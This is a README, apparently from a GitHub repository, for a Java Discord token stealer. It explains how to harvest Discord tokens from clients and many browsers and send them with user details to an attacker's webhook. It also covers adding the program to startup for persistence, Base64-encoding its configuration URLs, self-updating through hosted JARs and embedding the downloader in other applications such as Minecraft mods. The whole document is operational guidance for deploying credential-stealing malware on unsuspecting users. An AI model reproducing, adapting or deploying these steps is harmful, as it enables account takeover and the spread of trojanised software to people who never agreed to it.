Simple Discord token logging utility written in Java. Supports both [Clients](#supported-clients) and [Browsers](#supported-browsers).
## Features
- Capture tokens saved by Discord clients and browsers in LevelDB files
- Retrieve user information using said tokens and seamlessly send it to a designated webhook in an easily customizable embed format with placeholders
- Deployment through a lightweight downloader that operates independently of external dependencies
- Added to startup for persistence, ensuring continuous monitoring.
- Enhance and adapt the application's functionality as needed through auto-update capabilities
## Dependencies
- Java 8
- [Jackson](https://github.com/FasterXML/jackson)
- [JNA](https://github.com/java-native-access/jna)
- [OkHttp](https://github.com/square/okhttp)
- [mslinks](https://github.com/DmitriiShamrikov/mslinks)
## Usage
1. Host three empty files on GitHub similar to [/examples/](../blob/master/examples/). Any other service works too, as long as the URL of each hosted file remains the same after updating them.
2. Encode the URLs of your Discord webhook, the Updater JAR and the Version Info file in Base64.
    ```
   https://discord.com/api/webhooks/...    >>>   aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvZXhhbXBsZQ==
   https://github.com/.../Updater.jar      >>>   aHR0cHM6Ly9naXRodWIuY29tLzB4NWQwL0Rpc2NvcmQtVG9rZW4tTG9nZ2VyL3Jhdy9tYXN0ZXIvZXhhbXBsZXMvVXBkYXRlci5qYXI=
   https://github.com/.../Version%20Info   >>>   aHR0cHM6Ly9naXRodWIuY29tLzB4NWQwL0Rpc2NvcmQtVG9rZW4tTG9nZ2VyL3Jhdy9tYXN0ZXIvZXhhbXBsZXMvVmVyc2lvbiUyMEluZm8=
   ```
3. Update the **Config** class accordingly:
    ```java
    public static final String WEBHOOK_URL      = decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvZXhhbXBsZQ==");
    public static final String VERSION_INFO_URL = decode("aHR0cHM6Ly9naXRodWIuY29tLzB4NWQwL0Rpc2NvcmQtVG9rZW4tTG9nZ2VyL3Jhdy9tYXN0ZXIvZXhhbXBsZXMvVXBkYXRlci5qYXI=");
    public static final String UPDATER_JAR_URL  = decode("aHR0cHM6Ly9naXRodWIuY29tLzB4NWQwL0Rpc2NvcmQtVG9rZW4tTG9nZ2VyL3Jhdy9tYXN0ZXIvZXhhbXBsZXMvVmVyc2lvbiUyMEluZm8=");
    ```
4. *(Optional)* Adjust the download paths for the Updater, the Application and the version number respectively in the **Config** class:
    ```java
    public static final String UPDATER_SAVE_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\ExampleUpdater.jar";
    public static final String APP_SAVE_PATH     = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Example.jar";
    public static final int    VERSION_NUMBER    = 1;
    ```
5. Build the **Application**(`gradle applicationJar`) and the **Updater** (`gradle updaterJar`)
6. Update your hosted files with the newly built JARs and edit the Version Info similarly to [/examples/Version Info](../blob/master/examples/Version%20Info), making sure the value of "version" matches the VERSION_NUMBER specified earlier:
    ```json
    {
    "version":1,
    "link":"https://github.com/0x5d0/Discord-Token-Logger/raw/master/examples/Application.jar"
    }
    ```
7. Implement the Downloader source in your preferred Java application (such as a Minecraft mod) and build it.
8. Run the standalone Downloader or the Java application with the integrated downloader, your Discord token and related user information will be automatically sent to your webhook.
## Auto-Update
- ### Application
  To distribute updates to all instances of your application, you must first locate and update the version number in the **Config** class to a higher value than the current one.This version number will help identify whether an update is available. You can then make the necessary changes to your main application and build it. Finally, host the new version and update the version information file to reflect these changes. This file serves as a reference for your application to determine whether an update is needed.

  *Be cautious when updating the version number. If the version number specified in the UpdateHelper class is smaller than the one in the version information file, the Application and Updater will enter a loop of downloading and deleting each other continuously. Make sure to keep the version numbers consistent to avoid this issue.*
- ### Updater
  To distribute new versions of the updater itself, simply build it with the necessary changes and replace the old file with it. The main application will download it the next time an update is needed.

  *If you cannot get the same URL for the updater as before, you will have to push a dummy update of the main application with a higher version number and the link to the new updater jar. In general, if you do not own a server, it would be good practice to host the files on GitHub and update them through that to retain the same URLs.*

### Supported Clients
- Discord
- Discord Canary
- Discord PTB

### Supported Browsers
- Brave Browser
- Epic Privacy Browser
- Falkon
- Firefox
- Firefox Beta
- Firefox Developer Edition
- Firefox Nightly
- Google Chrome
- Google Chrome Beta
- Google Chrome Canary
- Google Chrome Dev
- Iridium
- Librewolf
- Microsoft Edge
- Opera
- Opera Beta
- Opera Developer
- Opera GX
- Pale Moon
- (Ungoogled) Chromium
- Vivaldi
- Waterfox
- Yandex